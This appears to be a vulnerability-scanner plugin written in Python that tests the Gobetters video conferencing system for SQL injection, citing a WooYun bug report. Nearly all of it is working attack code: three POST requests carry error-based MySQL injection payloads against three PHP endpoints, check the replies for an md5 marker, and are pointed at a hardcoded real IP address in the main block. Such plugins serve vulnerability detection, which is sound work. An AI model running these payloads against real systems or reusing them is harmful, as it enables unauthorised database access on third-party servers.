#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:Gobetters视频会议系统post注入再3枚
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0134733


def assign(service,arg):
    if service=="gobetter":
        return True,arg 


def  audit(arg):
    url=arg+"web/monitor/monitormentsave.php"
    post="deptid=1&=1&deptcode=1&deptlogo=1%27%20AND%20(SELECT%208709%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)--%20tanc&deptdesc=1"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
    url=arg+"web/monitor/monitorsave.php"
    post="ac=11&rt=1&id=1&rtnum=1&equid=1&equid=1&parentid=1&from=1&equipment=1%20AND%20(SELECT%208709%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)--%20tanc&equipname=1*&equid=1*&equipid=1*&equippwd=1*&equipip=1*&equipport=1*&equipnum=1*&orgid=1*"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
    url=arg+"web/users/result.php"
    post="username=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'ninq'='ninq"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    audit(assign('gobetter','http://218.89.3.21:89/')[1])